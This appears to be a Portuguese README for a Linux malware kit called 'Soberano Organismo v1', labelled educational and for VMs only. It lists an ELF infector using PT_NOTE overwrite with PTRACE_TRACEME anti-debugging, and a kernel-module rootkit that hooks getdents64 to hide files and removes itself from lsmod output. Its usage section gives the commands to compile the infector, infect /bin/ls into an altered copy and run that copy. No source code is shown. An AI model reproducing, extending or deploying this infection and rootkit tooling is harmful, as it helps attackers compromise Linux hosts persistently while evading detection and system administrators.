# Soberano Organismo v1 - Educational Linux Persistence & Stealth

**Aviso**: Material puramente educacional para pesquisa em ambientes controlados (VMs). Não use em sistemas de produção.

## Componentes

### 1. infector_integrado.c
- PT_NOTE Overwrite (stealth máximo - tamanho do arquivo preservado)
- Anti-debug via PTRACE_TRACEME
- Integração automática com LKM

### 2. soberano_hide.c
- LKM rootkit
- Hook de getdents64 (esconde arquivos)
- Auto-hide do próprio módulo (lsmod não mostra)

## Uso
```bash
# 1. Compile LKM e coloque em /tmp/soberano_hide.ko
# 2. Compile infector
gcc -o infector_integrado infector_integrado.c -O2 -s

# 3. Infecte
./infector_integrado /bin/ls /tmp/ls_soberano

# 4. Execute
/tmp/ls_soberano
